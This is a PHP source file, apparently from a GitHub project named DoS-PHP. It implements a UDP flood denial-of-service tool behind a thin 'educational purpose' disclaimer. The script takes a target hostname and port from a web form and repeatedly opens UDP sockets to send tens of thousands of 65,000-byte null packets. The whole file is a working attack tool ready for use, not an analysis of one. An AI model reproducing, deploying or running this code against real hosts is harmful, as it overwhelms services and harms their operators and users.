<?php

/**
 * @package DoS
 * @link https://github.com/iBryMax/DoS-PHP
 * @author iBryMax
 * 
 * This tool is written on educational purpose, please use it on your own good faith
 * 
 * GNU GENERAL PUBLIC LICENSE Version 3, 29 June 2007
 * Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 * Everyone is permitted to copy and distribute verbatim copies
 * of this license document, but changing it is not allowed.
 */

class DoS {

    const DEFAULT_BYTE = "\x00";
    const DEFAULT_PACKETS_SIZE = 65000;
    const MAX_PACKETS_SIZE = 65000;

    /** @var array */
    protected array $data = [];

    /**
     * DoS Constructor.
     * @param array $data
     */
    public function __construct(array $data){
        $this->setData($data);
        $this->attack();
    }
    
    /**
     * @param string $hostname
     * @param int $port
     * @param string $out
     * @return bool
     */
    protected function open_udp_connection(string $hostname, int $port, string $out) : bool {
        $socket = @fsockopen("udp://".$hostname, $port, $errno, $errstr, 15);
        if($errno and $socket){
			throw new \Exception($errstr, $errno);
		}elseif(!$socket) {
			throw new \Exception($errstr, $errno);
		}
        print("SOCKET opened\nhostname: $hostname\nport: $port"."<br>");
        if(!@fwrite($socket, $out)){
            throw new \Exception("An error occurred while sending the data");
        }
        fclose($socket);
        print("Closing socket $hostname:$port");
        return true;
    }

    /**
     * @return void
     */
    protected function attack() : void {
        $packets = 0;

        print("UPD Flood Started");
        while(++$packets < self::MAX_PACKETS_SIZE){
            print("Sending packet#.".$packets."<br>");
            $this->open_udp_connection($this->getData()["hostname"], $this->getData()["port"], str_repeat(self::DEFAULT_BYTE, self::MAX_PACKETS_SIZE));
        }
        print("UPD Flood Finished");
    }

    /**
     * @param array $data
     * @return void
     */
    protected function setData(array $data) : void {
        $this->data = $data;
    }

    /**
     * @return array
     */
    protected function getData() : array {
        return $this->data;
    }
}

if(empty($hostname = $_POST["hostname"])){
    print("Hostname was not placed, try again");
    return;
}
if(empty($port = $_POST["port"])){
    print("Port was not placed, try again");
    return;
}

$data = [
    "hostname" => $hostname,
    "port" => $port,
];

new DoS($data);

?>